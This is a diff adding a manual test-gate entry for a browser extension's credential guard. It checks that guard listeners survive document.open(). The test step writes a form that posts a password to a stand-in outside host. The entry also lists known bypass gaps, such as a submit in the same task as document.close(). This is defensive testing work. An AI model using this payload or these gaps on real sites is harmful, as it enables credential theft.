@@ -229,6 +229,16 @@ live.
   survivor); green CI is not containment evidence, so do not run the manual gate
   on the current head. Full procedure in that branch's
   `docs/agentic/GATE3_GUIDES.md`.
+- **AI-54** — PR #1106 (issue #1105), branch `test/document-open-guard`, code head `9c896f42` (later commits on the
+  branch are documentation only). Scope: a page that calls `document.open()` no longer strips the credential guard's
+  `submit` and `paste` listeners (they are re-added through one shared `MutationObserver` on `document`). Check in
+  branded Chrome with the unpacked build of that head: (1) on a page whose script runs
+  `document.open(); document.write('<form method=post action="https://other.example/x"><input type=password name=p value=x><button id=go>Go</button></form>'); document.close()`,
+  clicking Go still shows the "Credential submit blocked" prompt and Cancel sends nothing to the other host;
+  (2) a normal login on a real site still prompts (when risky) or goes through after "Proceed once" as before.
+  The local fixture is `tests/e2e/credential-document-open.spec.ts`. Known gaps, not part of this gate: a submit
+  dispatched in the same task as `document.close()` (before the observer runs), the MAIN-world and disabled
+  js-behaviour listeners, Firefox. Reply `AI-54 done; Gate-3 passed at 9c896f42` or describe what differed.
 ### Integration closeout receipt
 
 This row records integration state, not a human-test result:
